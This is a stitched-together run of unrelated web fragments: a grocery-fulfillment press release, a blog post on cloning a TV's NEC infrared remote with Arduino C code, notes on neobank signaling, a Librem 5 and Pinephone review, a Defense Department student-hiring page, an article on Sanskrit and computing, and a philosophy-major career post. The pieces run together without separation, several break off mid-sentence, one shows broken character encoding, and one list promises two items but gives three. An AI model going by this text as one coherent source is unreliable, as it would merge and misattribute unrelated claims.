to see if this story can grow bigger!</p><p>And of course hoping for an end to COVID-19. Thank you frontline health workers, you are the real heroes.</p></div></div>]]>

In fact, a large national grocery retailer recently deployed ThryveAI’s fulfillment capabilities at 250 locations nationwide in as little as three months.</p><h2><b>Thryve Fulfillment</b></h2><p>High pick rates are achieved by efficient order fulfillment. ThryveAI’s fulfillment solution includes:</p><ul><li><b>Picking Path Optimization:</b> Based on data provided by the individual grocery store, the system optimizes each pick path accordingly, ensuring pickers take the most efficient physical path to pick, also taking into account storage temperature.</li><li><b>Item-Level Mapping:</b> Pickers use a handheld device to identify the exact location of an item, supplemented with images and directions.</li><li><b>Multi-Order Picking: </b>Pickers can fill multiple orders at once to scale fulfillment capacity without increasing costly headcount.</li><li><b>Dashboards:</b> Provides real-time visibility into picking performance at the store/sector/employee level to ensure items are picked correctly and efficiently.</li></ul><p>In Q3 alone, four new grocers from across the U.S. and overseas joined ThryveAI’s fast-growing roster of customers, including IGA Australia. These new customers will have access to the picking solution, as well as the full ThryveAI platform. The complete ThryveAI platform includes:</p><ul><li><b>Thryve Commerce:</b> A complete e-commerce solution for retailers to accept, process orders and manage their digital storefront(s).</li><li><b>Thryve Fulfillment:</b> An order orchestration and fulfillment application for grocers to increase efficiency.</li><li><b>Thryve Mobile: </b>A full-featured mobile application that makes it easy for shoppers to order groceries for delivery or pick-up.</li><li><b>Thryve Search:</b> A search management and merchandising tool that presents AI-powered personalized recommendations to shoppers to enhance their experience and increase basket size.</li></ul><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.prnewswire.com%2Fnews-releases%2Fthryveai-fulfillment-solution-helps-grocers-triple-the-efficiency-of-in-store-pickers-301186630.html&amp;t=NzEwN2Y0NzNlZGUyM2QxMjkyYzQ5MmRkNjA1NTZjMDFjODI0YjI5NSw1VWQwME5hYQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F636888115808698368%2Fthryveai-fulfillment&amp;m=0&amp;ts=1607649144">Mi9 Retail</a></b></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/619211376334913536/scandit-series-c">Barcode scanning startup Scandit raises $80M in Series C round</a></p>

<h2>Context :</h2>
<p>One of my earliest paychecks went into a cheap 22" TV. It's not fancy at all, but it was a nice upgrade from the old Sony Trinitron TV that was starting to show its age. The new TV has a brand name of "Vision", which is less glamorous than "Sony", but it has been working well so far, so I can't really complain. Just the other day, I found out that it is possible to get it to record something while it's on standby. It's a feature I never knew I needed until I discovered it.</p>

<p>A couple of months after I got it, I ran into a problem with the remote controller. Luckily it turned out to be caused by a dead battery. Even though it was trivial to fix, this minor incident planted the seed of fear in me. Since the TV doesn't have physical buttons, I concluded that it would become useless should the remote stop working for some reason or another. Because of this, I decided to make a backup of the remote in case something happens to it. To do so, I had to find out more about the infrared communication protocol that the TV understands.</p>

<p>Edit : I found out that the TV does have physical buttons, but they're behind the screen, which makes it horrible in terms of UX.</p>

<p>Typing "Vision TV infrared protocol" into google yielded no useful results. I figured that I might have to do some reverse engineering to find out about more the protocol. Maybe if I inspect the signal that the remote produces, I could deduce what commands to send to the TV. But that would be tedious and it would require an IR receiver coupled with some sort of logic analyzer. I did some more googling and discovered <a href="https://github.com/ukw100/IRMP">IRMP</a>, an Arduino library that does exactly what I need. In order to use it, I would need an infrared receiver so that I could feed infrared signals to the Arduino. I thought about salvaging it from an old VCR, but eventually decided to just order it online. I ended up ordering <a href="https://shoppingmaroc.net/capteurs-shields/143-capteur-infrarouge-universel-reception-tl1838-vs1838.html">the TL1838 IR sensor</a> along with a few infrared LEDs. Shopping Maroc delivered the products ASAP, which I appreciated.</p>

<p>The sensor is easy enough to use. I plugged the VCC and GND pins accordingly, then attached its OUT pin to one of the Arduino's digital inputs. After installing the library in the Arduino IDE, I uploaded the <a href="https://github.com/ukw100/IRMP/blob/master/examples/AllProtocols/AllProtocols.ino">AllProtocols</a> sketch to it. It can be found in File &gt; Examples &gt; IRMP &gt; AllProtocols. I fired up the serial monitor, reset the Arduino, and was immediately greeted with the following message :</p>

<pre>23:44:11.409 -&gt; START /tmp/arduino_modified_sketch_735654/AllProtocols.ino
23:44:11.409 -&gt; Version 1.3.1 from Nov 14 2020
23:44:11.409 -&gt; Ready to receive IR signals at pin 11
</pre>

<p>I pointed the remote towards the IR sensor and pressed the standby button. The device detected a NEC signal.</p>

<pre>23:44:17.317 -&gt; P=NEC  A=0xFE01 C=0x10
</pre>

<p>Great! I could have stopped right then and there. The IRMP library already recognizes the protocol in question, so the problem of "backing up the remote" was technically solved. However, I decided that it would be interesting to try and reproduce the protocol from scratch, especially since I had a lot of fun writing <a href="https://github.com/azihassan/SonyRemote/">a similar tool</a> for the Sony TV I mentioned earlier. This time though, I wanted to do it without relying on the Arduino software.</p>

<p>The <a href="https://www.sbprojects.net/knowledge/ir/nec.php">SB-Projects</a> website contains documentation for many IR protocols. It came in handy it when I was working on the Sony remote clone, and I was pleasantly surprised to find out that it also explains the workings of the NEC protocol.</p>

<p>When a button is pressed, the remote sends a signal that includes an address and a command. I found that in my case, the address is set to 0xfe01. The commands change depending on what button was pressed. For example, 0 to 9 conveniently map to 0x0 to 0x9, POWER maps to 0x10, volume up maps to 0xe, etc. These values are sent LSB first. In order to send 0x19, which is 0b11001 in binary, we send the rightmost bit(1), shift to the right, send the rightmost bit again (0), shift to the right again, and repeat this process 8 times. The bits of 0x19 are therefore transmitted in this order : 1, 0, 0, 1, 1, 0, 0, 0</p>

<p>Bits are encoded like this :</p>

<ul>
  <li>ones are encoded as a 560us pulse followed by three 560us spaces</li>
  <li>zeros are encoded as a 560us pulse followed by a 560us space</li>
</ul>

<p><a href="https://1.bp.blogspot.com/-0t5VwaKq9BI/X6GyaChJwCI/AAAAAAAAAbs/2M00mlgAPAsCylcH1C-auZvWQlsVheTNACLcBGAsYHQ/s0/S%25C3%25A9lection_035.png"><img alt="" data-original-height="98" data-original-width="679" src="https://1.bp.blogspot.com/-0t5VwaKq9BI/X6GyaChJwCI/AAAAAAAAAbs/2M00mlgAPAsCylcH1C-auZvWQlsVheTNACLcBGAsYHQ/s0/S%25C3%25A9lection_035.png"></a></p>
<p>This is what the sequence "1, 0, 0, 1, 1, 0, 0, 0" looks like on GTKWave</p>

<p>If you zoom in on the pulses, you'll notice that they're not in a continuously high state. Instead, the LED rapidly switches between the ON and OFF states. It does this at a frequency of roughly 38 khz. Most infrared protocols operate at this frequency. The percentage at which the high state is activated (duty cycle) should be about 33% according to sbprojects, although I did get the TV to respond with a different duty cycle.</p>

<p><a href="https://1.bp.blogspot.com/-VNAlGh068VA/X6GzKFFrN1I/AAAAAAAAAb0/qSS7QMqLqnIugK-Udx6oPF4PrmVhqGWXwCLcBGAsYHQ/s0/S%25C3%25A9lection_036.png"><img alt="" data-original-height="60" data-original-width="188" src="https://1.bp.blogspot.com/-VNAlGh068VA/X6GzKFFrN1I/AAAAAAAAAb0/qSS7QMqLqnIugK-Udx6oPF4PrmVhqGWXwCLcBGAsYHQ/s0/S%25C3%25A9lection_036.png"></a></p>

<p>One peculiarity of the NEC protocol is that addresses and commands are sent twice. Once an address is sent, it is immediately followed by its complement. The remote basically inverts the bits of the address then sends it again. Once done, it sends the command, inverts its bits and sends it again. This serves as an error checking mechanism.</p>

<p>I found that in my case, the TV uses a modified version of the NEC protocol that has 16-bit long addresses and 8-bit commands. It took me a while to figure out that the first 16 bits are set to 0xfe01, and that the last 16 bits contain an 8-bit command followed by its complement.</p>

<p>All sessions are preceded by a start pulse of 9ms and a 4.5ms space. All sessions finish with a 560us pulse.</p>

<h2>Implementation :</h2>

<p>One of the main roadblocks I ran into consisted of the inability to tell what the code I wrote actually did. In the beginning, I only had a binary feedback. I'd write some code, upload it to the Arduino, point the infrared LED to the TV and hope for the best. It quickly became apparent that this was not optimal.</p>

<p>When I wrote a similar tool for the Sony TV, I had a Windows installation so I used <a href="https://www.labcenter.com/">Proteus</a>. It was called Proteus ISIS then, but then the terrorist organization of the same name went and gave it a bad rep.</p>

<p>I had access to Proteus because I was a student, which is no longer the case. I also switched to Linux since, and although I was able to get the demo version of Proteus to run on Wine, it was not enough. I did some googling and found out about <a href="https://github.com/buserror/simavr">simavr</a>. Thanks to this project, I was able to get an output from a specific pin of the microcontroller in the form of a VCD file. I used <a href="https://github.com/gtkwave/gtkwave">GTKWave</a> to visualize it. That's how I took the screenshots I posted in this article.</p>

<p>To get the code to work with simavr, I had the following code to main.c :</p>

<pre>#include &lt;avr/avr_mcu_section.h&gt;

AVR_MCU(F_CPU, "atmega328");

const struct avr_mmcu_vcd_trace_t _mytrace[]  _MMCU_ = {
    { AVR_MCU_VCD_SYMBOL("PB5"), .mask = (1 &lt;&lt; PB5), .what = (void*)&amp;PORTB, },
};
</pre>

<p>I also had to put <code>sleep_cpu</code> at the end of <code>main()</code> to keep simavr from running indefinitely.</p>

<p>And finally, I made sure to incorporate <code>-Wl,--undefined=_mmcu,--section-start=.mmcu=0x910000</code> in the <code>avr-gcc</code> invocation. After compiling the code, I run <code>simavr -m atmega328p -f 16000000 -t main.elf</code> to get a gtkwave-compatile VCD file in the output.</p>

<p>The Arduino I'm using has an Atmega328p chip. I plugged the LED into the D13 pin, which corresponds to the atmega's PB5 pin. To switch the state of PB5, we have to switch the state of the fifth bit of the PORTB register. To set it to 1, all we have to do is OR PORTB with 00100000, or 1 left-shifted 5 times :</p>

<pre>PORTB |= (1 &lt;&lt; PB5)
</pre>

<p>The other bits will keep their values because ORing them with 0 has no effect. To disable the PB5 bit however, we will have to AND it with 0 and AND the other bits with 1, so that their value remains intact. In other words, PORTB has to be ANDed with 11011111. This happens to be the complement of 00100000 (1 &lt;&lt; PB5) :</p>

<pre>PORTB &amp;= ~(1 &lt;&lt; PB5)
</pre>

<p>If you made it this far , congratulations, you can now consider yourself an embedded software engineer</p>

<p>Remember when I said that bytes should be sent LSB first ? It can be done with a for loop :</p>

<pre>void send_byte(int pin, uint8_t value)
{
    for(int i = 0; i &lt; 8; i++)
    {
        if(value &amp; 1)
        {
            mark(pin);
        }
        else
        {
            space(pin);
        }
        value &gt;&gt;= 1;
    }
}
</pre>

<p>What about <code>mark</code> and <code>space</code> ? According to the theory section, a binary 1 is a 560 microsecond pulse followed by a 1680 space. A zero is a 560 microsecond pulse followed by a 560 microsecond space :</p>

<pre>void mark(int pin)
{
    modulate(pin, 560);
    _delay_us(1680);
}

void space(int pin)
{
    modulate(pin, 560);
    _delay_us(560);
}
</pre>

<p>Now to the trickiest part : <code>modulate</code>. Its responsibility is to switch the PB5 pin on and off at a frequency of 38 khz for a given <code>duration</code>. Each on and off switch has to take place in 1/38000 seconds, which roughly corresponds to 26 microseconds. As such, it should perform this operation <code>duration / 26</code> times.</p>

<pre>void modulate(int pin, int microseconds)
{
    for(int i = 0; i &lt; microseconds / 26; i++)
    {
        PORTB |= (1 &lt;&lt; pin);
        _delay_us(13);
        PORTB &amp;= ~(1 &lt;&lt; pin);
        _delay_us(13);
    }
}
</pre>



<p>I kept changing the duty cycle until I got satisfying results, so I left it at 50%. These timings are not accurate because the code doesn't take into consideration the time it takes to switch the state of the PB5 pin. Despite this, it still gives acceptable results. To test this, I hardcoded a set of commands that would allow me to play a file from USB if I point the infrared at the TV and reset the Arduino. The video below demonstrates this. I apologize in advance for the abysmal quality :</p>



<p>The full code is available on <a href="https://github.com/azihassan/NEC-IR">Github</a>, but here's the relevant portion :</p>

<pre>int main(void)
{
    send_message(PB5, ADDRESS, POWER);
    _delay_ms(8000);
    send_message(PB5, ADDRESS, SOURCE);
    _delay_ms(2000);
    send_message(PB5, ADDRESS, UP);
    _delay_ms(2000);
    send_message(PB5, ADDRESS, OK);
    _delay_ms(1000);
    send_message(PB5, ADDRESS, OK);
    _delay_ms(1000);
    send_message(PB5, ADDRESS, DOWN);
    _delay_ms(1000);
    send_message(PB5, …</pre></div></div>

									<p><span>Julian wrote “</span><a href="https://julian.digital/2020/03/28/signaling-as-a-service/"><span>Signaling-as-a-Service</span></a><span>” back in March 2020 (which I highly recommend reading) that dove deep into many aspects of signaling. In this piece however, he outlines the mix between signaling and neobanks.</span></p>
<p><span>To start, Julian believes signaling explains our everyday lives, “what clothes we wear, which universities we pick and which religion we subscribe to. Everything has a hidden signaling component with which we communicate our desired tribal affiliation.”</span></p>
<ul>
<li><span>A Rolex isn’t any better at telling time than a cheaper watch. However, a Rolex signals status and wealth.</span></li>
</ul>
<p><span>Most of us know traditional banks such as Chase and Wells Fargo, however, there’s a less traditional kind of bank called a neobank:</span></p>
<ul>
<li><span>Neobanks are entirely managed via an app&nbsp;</span></li>
<li><span>Neobank card holders are the equivalent to the kids that sit at the cool-kids-table. Many of the neobanks feel more like lifestyle brands than banks or tech companies, Julian mentions.</span></li>
<li><span>Neobank premium subscriptions come with nicer looking cards: </span><a href="https://www.apple.com/apple-card/"><span>titanium</span></a><span>, </span><a href="https://www.treecard.org/"><span>wood</span></a><span>, </span><a href="https://twitter.com/cashapp/status/1290694734529400832"><span>glow-in-the-dark yellow</span></a><span>, </span><span><a href="https://n26.com/en-de/metal">N26</a>,</span><span> or </span><a href="https://www.revolut.com/en-US/revolut-metal"><span>Revolut Metal</span></a><span>.&nbsp;</span></li>
<li><span>Some neobank cards have no credit card number on the front. “[Making it easier for users to share photos of their cards on social media as an additional signaling distribution channel.” — Julian Lehr</span></li>
</ul>
<p><span>A main point in Julian’s piece is that on in-groups and out-groups. Every signaling scenario has those two possible audiences. “The in-group is the tribe you want to join and signal your affiliation to. The out-group is everyone else – people you want to distance yourself from.”</span></p>
<ul>
<li><span>Think iMessages blue text messages vs. Android’s green text messages.&nbsp;</span></li>
</ul>
<p><span>Here are two ways to increase the signaling power of an out-group:</span></p>
<ol>
<li><span>Raise prices</span></li>
<li><span>Create artificial scarcity&nbsp;</span></li>
<li><span>Have a larger out-group who is aware of the in-group and vice versa</span></li>
</ol>

								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><b><i>My two cents</i></b><span>: Neobanks aren’t as talked about as much as people think. Maybe it’s because I’m not sitting at the cool kids table. A friend of mine got a titanium Apple credit card and would “accidentally” drop it on the table before handing it over to the waiter. Of course, it would make a significantly louder noise than my battered-plastic card. Signaling can take many forms. </span></p>

<p>On <em>2020-12-06</em> by <em>ThatGeoGuy</em></p>

<p>Huzzah! I recently received my Librem 5 (Evergreen) from
<a href="https://puri.sm/">Purism</a>. The Librem 5 is a smartphone that runs an otherwise
standard linux kernel. However, unlike Android which also relies on the linux
kernel under the hood, the Librem 5 uses a GNU userspace, adapted for mobile.
This makes it more akin to your typical laptop in some ways, although the form
factor still resembles a modern smartphone (at least, mostly). Here are some
preliminary thoughts about the phone and how it compares to
<a href="https://pine64.org/">Pine64</a>’s Pinephone, which is another phone that uses
neither Android nor iOS, and relies on a GNU / Linux based OS.</p>

<p>This is a bit of a long post, and I’m sorry for that. Brevity is certainly a
hard-earned skill, but going forward without comparing the Librem 5 to the
Pinephone seemed like the wrong choice ;)</p>



<h2 id="purism-librem-5">Purism Librem 5</h2>

<p>Purism touts the Librem 5 as a “Security and Privacy Focused Phone.” This is
not wholly untrue, and there are some features that are unique to the Librem 5
in this respect. For example, there are “kill-switches” on one side of the
phone that allow you to disable:</p>

<ul>
  <li>Mobile network and mobile data</li>
  <li>Wifi &amp; Bluetooth</li>
  <li>Camera &amp; Microphone</li>
</ul>

<p>There’s an additional feature where if you disable all three switches, then
other sensors on the phone such as GPS are all disabled as well. You’d be
better served reading through the <a href="https://puri.sm/products/librem-5">Librem 5 product
page</a> to learn more.</p>

<h2 id="pine64-pinephone">Pine64 Pinephone</h2>

<p>In contrast to the Librem 5, which touts itself as being privacy and security
focused, the <a href="https://www.pine64.org/pinephone/">Pinephone is touted as</a> “An
Open Source Smart Phone Supported by All Major Linux Phone Projects.” It is
considerably different from the Librem 5 in many ways, from the hardware all
the way to the final software. It too has kill-switches, but these are not easy
to access on the side of the phone and instead are inside the case of the
phone. You can access these kill-switches by removing the back plate.</p>

<p>One of the neat things about the Pinephone is the ability to boot and use a
variety of Linux distributions on the hardware itself. It’s as easy as loading
the distro onto an SD card, and then booting the phone. You don’t even have to
flash anything to the internal eMMC in order to run it!</p>

<h2 id="price-">Price $$$</h2>

<h3 id="librem-5">Librem 5</h3>

<p>The Librem 5 starts at $799.00 USD, or can be purchased at $1999.00 USD if you
want your Librem 5 assembled in the good ol’ US of A before they ship it to
you. There’s a lot of talk about anti-interdiction or controlling the supply
chain, but trust me in saying that you’re definitely not in the market for a
$2k phone like the Librem 5. I don’t know anyone who is.</p>

<p>I could probably write an entire post on the economics of this, but quite
frankly, it’s kind of appalling that literally anyone would pay this much. It’s
kind of appalling that Purism would charge this much. I can imagine a scheme
where the parts are shipped from China, and verified and assembled by a
part-time college student in the States and they’d likely still be able to
price it cheaper than $1999.00.</p>

<p>Anyways this post isn’t about Purism’s business practices, of which I will
comment on at some point, but regardless I will drop this matter here. Please
just don’t spend $1999.00 on a Librem 5.</p>

<p>And for that one person who will eventually claim they did purchase the
$1999.00 USA version and it was very necessary for their use case: <em>look buddy,
I get it, you’ve drank the Kool-Aid on this one but I’m sincerely doubtful that
your very specific concerns and use-case apply to even the general nerd who
gets excited about the intersection of FOSS and mobile hardware. Moreover, I’m
doubtful that even if they did apply to such a niche group that $2k is a price
point upon which you still don’t balk at and go look for literally anything
else.</em></p>

<hr>

<p>
<strong>Update (2020-12-08)</strong>:
</p>
<p>
Many wonderful people on Hacker News as well as the
Purism / Librem Matrix channels corrected me on the fact that part of the
reason that the phone is so expensive is due to the fact that the PCB is
fabricated in the States, in addition to the assembly.  I am still inclined to
believe that the price is rather exorbitant. Perhaps had the USA edition been
something that had been launched after Evergreen was completed I would be less
averse to the idea of it. Nonetheless, I still think that for the general
person reading this: you should not purchase it. You might argue that I don't
know your threat vector, but Bayes' theorem would suggest you will be better
served spending your money on a regular Librem 5 and putting the remaining
funds to something more important to you (like maybe an iPhone, so you can use
Signal while it is unavailable on the Librem 5 :-P).
</p>
<hr>

<p>I bought my Librem 5 back during the original crowdfunding campaign, so I ended
up spending a lot less than even the $799 USD. Surprisingly, I’ve been waiting
on this phone since around the end of 2017, and here we are in 2020 and I
finally have it. Purism has been sending out what are effectively <a href="https://en.wikipedia.org/wiki/Engineering_validation_test">DVT and
EVT</a> runs of the
phone that have been going through several phases named Aspen, Birch, Chestnut,
Dogwood, and finally Evergreen. Evergreen is supposed to be the final version
of the hardware, which I opted for. I wanted to get the final, true Librem 5,
not one that could be radically different. While my unit does not have FCC
certification (it is technically what you might consider a PVT unit), it is
representative of the final hardware that Purism will land on for this phone,
as there is ostensibly no more hardware revisions.</p>

<h3 id="pinephone">Pinephone</h3>

<p>The Pinephone starts at $149.99 USD, sold in small batches surrounding a
particular distro / community that is building software for the device (called
<code>&lt;distro-name&gt;</code> Community Edition). Recent batches have made a “convergence
edition” available, for $199.99 USD. The convergence editions have an extra
gigabyte of RAM and a larger eMMC flash storage, and are touted as being useful
for connecting the Pinephone to a full-size monitor and running it as if you
had a full desktop available.</p>

<p>I originally purchased a Pinephone from the UBPorts CE batch. Eventually, I
upgraded my mainboard so that my specs match that of the convergence editions
from later batches. All in all, I’ve managed to spend more than the original
$200, but I’m not disappointed, since I have had a lot of fun with the
Pinephone.</p>



<p>For the vast majority of people, the Librem 5 and Pinephone are probably not
worth even considering. The GNU userspace and associated “mobile” paradigms
within it are very much not ready for daily use.</p>

<p>For the Librem 5, there are some security aspects that this “security and
privacy focused phone” don’t even hit (e.g.  hardware backed security / secure
enclave, device encryption, etc.). That’s not to say that these can’t be made
possible in future updates, but as far as the software story today goes, they
do not yet exist.</p>

<p>
Small note: Hardware-backed features like the secure enclave do not exist on
the base phone today. However, there is a smart card reader and the M.2 slots
used for the SIM And wifi/bluetooth chipsets on board could be replaced as
well. That said, this isn't exactly in "buy an iPhone and guarantee your
physical security" territory, and there's no clear path to "do X steps to
enable this" yet.

Basically, don't be tricked by the marketing to believe this is somehow the
full package at present. It is not.
</p>

<p>Anyways, so why do I, the author, care? I will admit, after my first bout of
usage, neither phone will be a daily driver for me. I will probably continue to
stick to my Pixel 3, and it is very likely that I will eventually get another
Android device at some point in the next two years. Linux phones are definitely
not yet ready to be daily drivers; however, they are interesting for a few key
reasons.</p>

<h2 id="device-longevity">Device longevity</h2>

<p>Digital waste is a blight on our society. I can admit that the year-over-year
hardware cycle provides a vast set of improvements that can change the
smartphone landscape. However, I also acknowledge that the number of phones,
tablets, and other electronics that find their way into landfills or are
otherwise rendered into trash is a growing concern. Linux phones and mobile
hardware present an opportunity to move away from that, and it’s important to
support this in some way.</p>

<h2 id="free-software">Free software</h2>

<p>I’m a fan of free software! While my day job isn’t working on FOSS, I think
that there’s a lot of benefits to having better FOSS software available. The
least of which is because leaps in the mobile space have also attracted others
to work on Linux in the desktop space as well.</p>

<h2 id="a-third-option">A third option</h2>

<p>I care about Linux phones because they present a third option from the Android
/ iOS duopoly. Even if they suck now in (a lot of) ways, they will improve over
time. I want to move towards a future where I don’t have to choose between an
OS that’s built towards data collection and advertising, and another that’s
built on locking you into an ecosystem.</p>



<p>First, before I get into my impressions comparing the two, I should at the very
least mention what I am / am not testing. I did not / will not test:</p>

<ul>
  <li>Phone calls &amp; SMS / MMS functionality
    <ul>
      <li>I do not have a secondary mobile number, and my primary mobile number is
registered to an e-SIM on my Pixel 3. So the best I can do is test how
mobile data works on a data-only SIM.</li>
    </ul>
  </li>
  <li>Convergence features
    <ul>
      <li>I don’t really plan to use these as anything other than a mobile device, so
I haven’t bothered plugging them into a display. Additionally, my display
may be a bit too large and high-resolution for either phone to drive it
effectively.</li>
    </ul>
  </li>
  <li>Email
    <ul>
      <li>This one is still on my TODO list, however I’ve been too lazy to try
setting this up on several of the Pinephone’s possible distros.</li>
    </ul>
  </li>
  <li>Cameras
    <ul>
      <li>The Librem 5 does not yet have a functioning camera. For a phone to ship
with the hardware but no software… Well it’s not typical. So I can’t
compare anything, given that the Librem 5 hasn’t yet made it possible to do
so.</li>
    </ul>
  </li>
  <li>GPS / location
    <ul>
      <li>Look, I want to do this more than …</li></ul></li></ul></div></div></div>

              The NSIN Hirethon program is an opportunity for DoD customers to access technical and entrepreneurial talent.
            </span></p><p>NSIN Hirethon gives DoD customers access to technical and entrepreneurial talent through in-person hiring events at top-tier universities.</p>

<hr>
<h2 id="overview">Overview</h2>

<p>The Hirethon program connects students with propensity to serve and the technical skills the government needs to
full-time employment, internships, and scholarship opportunities within DoD. NSIN offers students the opportunity to
meet with DoD organizations who are seeking their skill sets for full-time work on some of the DoD’s most compelling
technical problems. During the Hirethon, prospective student applicants submit a resume and speak in-person with
military representatives. Participants may be interviewed at the event and, in some cases, provided a tentative job
offer. At the end of the Hirethon, participants will have access to an online hiring tool to continue pursuing additional
DoD opportunities.</p>

<hr>
<h2 id="application--next-steps">Application / Next Steps</h2>

<p><strong>Interested in participating in an NSIN Hirethon event? Complete and submit this Interest Form.</strong></p>

<p><a href="https://forms.gle/whvMjWxTAnxWFYTX7"><span>Submit Now</span></a></p>

<hr>
<h2 id="hiring-organizations">Hiring Organizations</h2>

<p>To participate in the NSIN Hirethon program, hiring organizations must be actively seeking students or recent
graduates for full-time government service positions, internships with conversion opportunities, and/or
scholarship-for-service programs. These DoD customers are required to have direct hiring authority as well as
open billets that they are looking to fill. It is expected that these customers send both recruiters and hiring
managers to the Hirethon event itself, and must be able to execute expedited hiring processes, up to and including
on-the-spot tentative offers.</p>

<p>Interested DoD customers can email <a href="mailto:hirethon@nsin.us">Hirethon@NSIN.us</a> for more information.</p>

    <p><img height="269" width="268" data-delta="1" typeof="foaf:Image" src="https://www.utoronto.ca/sites/default/files/Libbie-Mills-IMG_1510-1-300s.jpg" alt="Libbie Mills"></p><p><strong>Libbie Mills</strong>, an assistant professor in the department for the study of religion in the University of Toronto’s&nbsp;Faculty of Arts &amp; Science, noticed something interesting this fall in her introductory Sanskrit class: computer science students.

</p>

<p>The course typically attracts students majoring in the study of religion, who are learning the language to further their research into Hinduism, Buddhism and Sikhism. Reading through her class list, however, Mills found that of six of the 40 enrolled students were actually computer science majors.&nbsp;</p>

<p>“I'm always excited when there are students from an unexpected place,” she says.&nbsp;</p>

<p>The lingual connection between Sanskrit and computer science, it turns out, has been the subject of interest for quite some time. The first well-known publication that examined the relationship was in 1985, when NASA scientist&nbsp;Rick Briggs&nbsp;published a research paper in which he argued that the 3,500-year-old language was the best candidate for programming artificial intelligence technology&nbsp;– namely because of its adherence to rigid grammatical rules.&nbsp;</p>

<p><strong>Paul Thomas</strong>, a fourth-year undergraduate student at St. Michael’s College who plans on majoring in computer science next year, says he&nbsp;has a proclivity for learning languages, but ultimately took the course because of its connection to coding.</p>

<p>“Sanskrit is a very computational language,” he explains. “It’s a lot of syntax, which is the structure of programming itself. Classical Sanskrit is an engineered language.”</p>

<p>There are nearly 4,000 rules&nbsp;recorded in the fourth&nbsp;century BCE grammar of Pāṇini, an ancient scholar of the language&nbsp;– and&nbsp;Mill’s approach to teaching it is methodical.</p>

<p>“I'm a nerd” she says. “I like mathy type things, and I teach in a bit of a sciencey way.”</p>

<p>She stresses to her students that this is not a typical language class, where after a few classes they’ll be able to casually practise what they have learned over coffee.&nbsp;</p>

<p>“It’s not conversational, there’s too much to learn at the beginning,” she says. “They must learn the characters&nbsp;and how words get put together. It’s mind-bogglingly awful at first.”&nbsp;</p>

<p>She starts with what she calls the building blocks&nbsp;–&nbsp;“the order of sounds we produce out of our mouths ... from the throat to palate to teeth to lips” –&nbsp;and enthuses over the “tidiness of the language”, where a few root words are the basis of the entire Sanskrit vocabulary.</p>

<p>“It's orderly,” Mills says. “If you know the systems for making words you can work backward&nbsp;to the root to understand the meaning of the word. It’s creative in an organized way. It is kind of amazing.”</p>

<p>Mills adds that she&nbsp;understands the affinity that computer programmers have with the language. “It’s good coding,” she says.&nbsp;</p>

<p>For Thomas, the strict grammatical rules of Sanskrit&nbsp;align well&nbsp;with the goals of computer programmers who are ultimately interested in the “question of how to create interface between computers and human languages.”&nbsp; He maintains that Sanskrit is well positioned to do so because of its algorithmic foundation. “Computers don’t understand linguistics, they understand rules,” he says.&nbsp;&nbsp;</p>

<p>In addition, the rigidity of Sanskrit makes it less likely that an artificial intelligence algorithm would misinterpret commands. The same can’t&nbsp;be said of a language like English, which is&nbsp;looser with its rules and where words have multiple meanings.</p>

<p>“In English, there are so many influences from different language streams,” Mills says. “It’s kind of a mess.”&nbsp;</p>

Yo! Welcome to Issue N27, this issue is all about UX! We go from UX design patterns to perceived performance and also

Within my daily work, WICKEDTEMEPLATES and some other upcoming projects I won't have so much time. So I will be taking in some guest curators, but I will make sure the links are fine and suitable.

December 7, 2020 | https://www.careerfair.io/reviews/benefits-of-philosophy-major | <a href="https://web.archive.org/web/*/https://www.careerfair.io/reviews/benefits-of-philosophy-major">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>
I majored in philosophy and now work in tech. 
</p>

<p>
I donâ€™t think I would have been able to transition into tech without any of the skills I developed outside the classroom (such as <a href="https://www.careerfair.io/reviews/skill-stack-for-tech-career">learning to code</a> &amp; pursuing quite a few internships). In fact, compared to my peers who studied engineering, Iâ€™ve had to invest much more time outside the classroom in picking up technical concepts. 
</p>
<p>
With that being said, I do think that my philosophy degree benefits me immensely with my day to day. 
</p>
<p>
The three main benefits of my philosophy degree have been the following:
</p>
<ol>

<li>Strong writing skills

</li><li>Ability to make the vague much more precise

</li><li>Ability to craft a strong argument
</li>
</ol>
<h2>Strong writing skills</h2>


<p>
No matter what your role is, youâ€™re going to be communicating with people. And in an increasingly remote world, the ability to express your ideas in a clear and concise manner is extremely valuable. 
</p>
<p>
As a philosophy major, the emphasis was always on writing clearly. Unlike in other humanities classes I took, like sociology, our papers didnâ€™t need to be very long. 
</p>
<p>
The goal was to eliminate fluff and get straight to the point. For example, there was no need to introduce your argument with some sort of historical narrative or background information. 
</p>
<p>
This approach lends itself well to the workplace. Think about long emails and unclear meeting agendas. The ability to parse out what matters and get rid of the rest will make you stand out. 
</p>
<p>
Another writing skill that my philosophy major taught me is â€œsign-postingâ€�. This has to do with using certain phrases, such as â€œ<em>I will give two examples to prove...â€� </em>or â€œ<em>My first objection isâ€¦â€�</em>, in order to make sure that the reader knows where the argument is going at all times. 
</p>

  <center>
    <img src="https://www.careerfair.io/assets_philobenefits/signposting.png" alt="">
  </center>

<p>
An added benefit of using sign-posting is that it enables the reader to skim your writing and still understand everything youâ€™re trying to say. In web design, itâ€™s often advised to ensure that your content is easy to skim by adding headings, sub-headings, images etc. Think of signposting as making your writing easier to parse. 
</p>
<p>
Finally, I realized early on that a philosophy paper is never written in one go. Itâ€™s an iterative process that demands you create a clear outline and revise each part until you have a coherent argument. 
</p>
<p>
Much of this revision process is better done by collaborating with other people. Reading your argument out loud will often make you realize that it doesnâ€™t make sense. Or that it actually doesnâ€™t get across what youâ€™re trying to say. 
</p>
<p>
I canâ€™t tell you how many times reaching out to someone at work to read over something I wrote has been helpful. Getting a second pair of eyes can help identify flawed assumptions and tighten up documentation. 
</p>

<h2>Ability to make the vague much more precise</h2>


<p>
Philosophy is pretty similar to math in the sense that both fields require you to make assumptions and then investigate the consequences of those assumptions.
</p>
<p>
Unlike math, though, which is very narrow and technical, philosophy aims to solve problems that are very messy and fuzzy. 
</p>
<p>
As a result, when investigating an open-ended question, it's a philosopherâ€™s job to add as much precision as possible. 
</p>
<p>
